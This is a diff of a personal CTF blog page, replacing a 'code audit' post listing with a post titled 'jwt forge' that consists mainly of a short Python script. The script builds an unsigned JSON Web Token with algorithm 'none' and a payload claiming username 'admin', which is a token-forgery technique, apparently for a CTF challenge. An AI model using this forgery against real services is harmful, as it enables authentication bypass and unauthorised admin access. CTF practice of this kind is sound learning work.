@@ -3,7 +3,7 @@
   <head>
      
     <meta charset="UTF-8">
-    <title>code audit - d0ud</title>
+    <title>jwt forge - d0ud</title>
     <link rel="shortcut icon" href="/static/img/icon.png">
     <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
     
@@ -15,7 +15,7 @@
 
     <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1"/>
     <meta property="og:site_name" content="d0ud">
-    <meta property="og:title" content=""/>
+    <meta property="og:title" content="jwt forge"/>
     
     <style>body:before{ content: ''; background-image: url(https://null-d0ud.github.io/img/bgg.png) }</style>
     
@@ -51,80 +51,56 @@
 
     <main>
     <div class="wrap min">
-        <section class="home-title">
+        <section class="post-title">
+            <h2>jwt forge</h2>
+            <div class="post-meta">
+                <time class="date">2022.04.13</time>
             
-            <h1>“code audit”</h1>
+                <span class="category"><a class="category-link" href="/categories/code/">code</a></span>
+            
+            </div>
         </section>
-        <section class="home-posts">
-    
-    <div class="post-item">
-        <h2>
-            <a href="/%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/">&lt;GWCTF 2019&gt;枯燥的抽奖</a>
-        </h2>
-    
-        <p>打开题目，从源码里发现check.php访问得到源码
-ljiUB7yF7i
+        <article class="post-content">
+        
+            <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
+a <span class="token operator">=</span> <span class="token string">'&#123;"alg":"none","typ":"JWT"&#125;'</span>
+b<span class="token operator">=</span> <span class="token string">'&#123;"secretid":[],"username":"admin","password":"a","iat":1649828192&#125;'</span>
 
-&amp;lt;?php
-#这不是抽奖程序的源代码！不许看！
-header(&#34;Content-Type: text/html...</p>
-    
-        <div class="post-meta">
-            <time class="date">2021.12.02</time>
-            
-                <span class="category"><a class="category-link" href="/categories/code-audit/">code audit</a></span>
-            
-            
-        </div>
-    </div>
-    
-    <div class="post-item">
-        <h2>
-            <a href="/%5BBJDCTF2020%5DEasySearch%201/">&lt;BJDCTF2020&gt;EasySearch 1</a>
-        </h2>
-    
-        <p>扫描目录得到index.php.swp
-&amp;lt;?php
-	ob_start();
-	function get_hash()&amp;#123;
-		$chars = &#39;ABCDEFGHIJKLMNOP...</p>
-    
-        <div class="post-meta">
-            <time class="date">2021.11.17</time>
-            
-                <span class="category"><a class="category-link" href="/categories/code-audit/">code audit</a></span>
-            
-            
-        </div>
-    </div>
-    
-    <div class="post-item">
-        <h2>
-            <a href="/%5BNPUCTF2020%5DReadlezPHP/">&lt;NPUCTF2020&gt;ReadlezPHP</a>
-        </h2>
-    
-        <p>打开题目，无提示，扫描目录，无果，在源代码里搜索php，发现隐藏链接
-打开得到源码
-&amp;lt;?php
-#error_reporting(0);
-class HelloPhp
-&amp;#123;
-   ...</p>
-    
-        <div class="post-meta">
-            <time class="date">2021.11.17</time>
-            
-                <span class="category"><a class="category-link" href="/categories/code-audit/">code audit</a></span>
-            
-            
-        </div>
-    </div>
-    
-</section>
+c <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>a<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'.'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+c <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">try</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        c<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span>
+<span class="token keyword">except</span><span class="token punctuation">:</span>
+    <span class="token keyword">pass</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-        <section class="page-navigator">
-            <span class="page-number current">1</span>
+        </article>
+        <section class="post-near">
+            <ul>
+                
+                    <li>上一篇: 看完啦 (つд⊂)</li>
+                
+                
+                    <li>下一篇: <a href="/%5BHFCTF2020%5DEasyLogin/">&lt;HFCTF2020&gt;EasyLogin</a></li>
+                
+            </ul>
         </section>
+        
+    
+        <section class="post-author">
+        
+            <figure class="author-avatar">
+                <img src="https://null-d0ud.github.io/img/logo.jpg" alt="d0ud" />
+            </figure>
+        
+            <div class="author-info">
+                <h4>d0ud</h4>
+                <p>a ctfer</p>
+            </div>
+        </section>
+    
     </div>
 </main>
 
